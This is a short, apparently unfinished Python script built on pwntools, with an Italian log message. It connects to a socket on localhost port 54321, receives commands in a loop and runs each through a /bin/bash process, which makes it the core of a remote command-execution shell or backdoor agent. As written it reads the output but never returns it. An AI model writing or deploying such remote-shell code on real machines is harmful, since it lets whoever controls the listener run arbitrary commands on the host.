from pwn import *

conn=remote("localhost",54321)

while True:
    mes=conn.recv().decode("utf-8")
    if mes:
        print(f"comando ricevuto: {mes}")
        sh=process("/bin/bash")
        sh.sendline(mes)
        out=sh.recvline(timeout=1)